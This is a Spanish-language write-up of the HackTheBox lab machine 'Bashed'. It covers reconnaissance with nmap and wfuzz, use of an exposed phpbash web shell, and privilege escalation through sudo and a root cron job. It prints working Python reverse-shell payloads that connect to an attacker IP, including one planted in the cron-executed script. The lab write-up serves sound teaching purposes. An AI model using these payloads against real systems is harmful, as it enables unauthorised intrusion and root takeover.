---
title: 'Bashed'
description: 'Write-Up de la máquina Bashed de HackTheBox'
pubDate: 'Jul 07 2025'
image: '/htb/bashed/placeholder.png'
heroImage: '/htb/bashed/placeholder.png'
private: false
category: 'writeups'
tags: ['htb', 'web', 'linux', 'python', 'fuzzing', 'php', 'reverse shell', 'privilege escalation']
---

## Fase de reconocimiento
### Puertos y servicios
Comenzamos con un escaneo con `nmap` para identificar los servicios, con la flag `-sV` para detectar versiones y `-sC` para ejecutar los scripts por defecto.

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

Vemos solo el puerto 80 abierto y el servicio que corre es `Apache 2.4.18` en `Ubuntu`. Al ver la web, vemos que es un blog de desarrollo de Arrexel, y que tiene un post sobre una herramienta llamada `phpbash`, en la cual nos indica que es una herramienta para ejecutar comandos de shell a través de PHP, y que la misma web la utiliza.

Al acceder al repositorio de GitHub, y en las capturas, nos indican que la ruta donde está ubicada la herramienta es en `/uploads/phpbash.php`, pero al intentar acceder a esa ruta, nos da un error 404, por lo cual decidimos fuzzear.

### Fuzzing
Para el fuzzing, usaremos wfuzz desde la raíz del sitio, con el objetivo de descubrir la ubicación de la herramienta `phpbash.php` u otros directorios interesantes. Ejecutamos el siguiente comando:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.29.77/FUZZ
```

* -c Para mostrar los resultados en color.
* --hc=404 Para ocultar los resultados con código 404.
* -t 200 Para establecer el número de threads a 200.
* -w Para indicar el wordlist a utilizar.

Finalmente, en los resultados podemos ver una ruta que nos puede interesar. `/dev`

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================
000000003:   301        9 L      28 W       313 Ch "images"                                                       
000000001:   200        161 L    397 W      7743 Ch     "http://10.129.29.77/"                                          
000000325:   301        9 L      28 W       310 Ch      "php"                                                          
000000537:   301        9 L      28 W       310 Ch      "css"                                                          
000000940:   301        9 L      28 W       309 Ch      "js"                                                           
000000821:   301        9 L      28 W       310 Ch      "dev" 
```

Al acceder a la ruta, vemos que tiene Directory Listing habilitado, lo que nos permite visualizar los archivos, incluyendo la herramienta phpbash.php que estábamos buscando.

## Fase de explotación
PHPBash, como su nombre indica, es una herramienta que nos permite ejecutar comandos de shell a través de PHP. Al acceder a la herramienta, vemos que tiene un campo para ingresar comandos, sin embargo, trabajar con ella resulta incómodo, no podemos limpiar consola ni agregar alias. Por lo cual procederemos a ganar una reverse shell y así poder hacer un tratamiento de la TTY y ejecutar los comandos de forma más cómoda.

### Reverse Shell
Para la reverse shell, podemos usar el repositorio de PayloadsAllTheThings, que tiene una gran variedad de payloads para diferentes lenguajes y tecnologías. En este caso, vamos a usar el payload de Python.

```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.230",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Una vez accedimos, procedemos a hacer el tratamiento de la tty y a ejecutar un pequeño alias para más comodidad:

```shell
export TERM=xterm; export SHELL=bash; alias ll="ls -lha";
```

## Fase de escalada de privilegios
### Buscando escalado
Antes de comenzar a buscar escalado, vamos a ver qué usuarios existen en la máquina, listando el contenido del archivo `/etc/passwd`:

```bash
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```

Vemos a `arrexel` y `scriptmanager` como usuarios, y a root como el usuario administrador. Vamos a ver si podemos escalar a alguno de estos usuarios.

### Escalada a ScriptManager
Como usuario `www-data`, podemos ejecutar `sudo -l` para ver si tenemos permisos de sudo y qué comandos podemos ejecutar:

```bash
sudo -l

User www-data may run the following commands on bashed:
  (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Vemos que podemos ejecutar comandos como el usuario `scriptmanager` sin necesidad de contraseña. Por lo cual, podemos hacer un `sudo -u scriptmanager -i` para iniciar sesión como ese usuario.

### Obteniendo root
Ya como scriptmanager, volvemos a ejecutar `sudo -l` para ver qué permisos tenemos, sin embargo esta vez nos bloquean pidiendo la contraseña del usuario.

También podemos ver los grupos a los que pertenecemos, pero no vemos nada interesante.

Un tercer paso, es ver a que ficheros tenemos permisos de escritura, para verificar si podemos modificar archivos ejecutados por root o crear condiciones de escalada de privilegios. Para esto, podemos usar el comando `find`, también recomiendo usar `grep` para filtrar los resultados y evitar directorios como `/proc` o `/sys` que no nos interesan.

```bash
find / -writable -type f 2>/dev/null | grep -vE "proc|sys"

# Resultados relevantes:
scripts/test.py
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
/var/www/html/uploads/index.html
```

Vemos que existe un fichero llamado `/scripts/test.py`, que parece ser un script de Python. Vamos a ver su contenido para ver si podemos hacer algo con él.

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Es un script bastante sencillo que simplemente escribe en un fichero llamado `test.txt` con el texto "testing 123!". Sin embargo, si listamos el directorio donde se encuentra, podemos ver que existe un fichero llamado `test.txt`, el cual fue creado recientemente por el usuario `root`, lo que sugiere que el script se ejecuta automáticamente mediante una tarea cron.

Podemos aprovechar esto para modificar el script e insertar un payload que nos de una reverse shell como root. Para esto, vamos a reutilizar el mismo payload de Python que usamos anteriormente, pero esta vez lo insertamos directamente en `test.py`:

```python
import socket, os, pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Conectamos al servidor y puerto donde queremos recibir la reverse shell
s.connect(("10.10.14.230", 443))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("/bin/sh")
```

Ahora solo nos queda esperar a que la tarea cron se ejecute y ya tendremos acceso como root.

```
listening on [any] 443 ...
connect to [10.10.14.230] from (UNKNOWN) [10.129.99.222] 33854
# whoami
whoami
root
# 
```

A pesar de que es una máquina fácil, el no ver el header de la versión de PHP nos puede hacer dar vueltas por un largo tiempo, por lo cual siempre es recomendable seguir una estructura e ir revisando paso a paso cada información.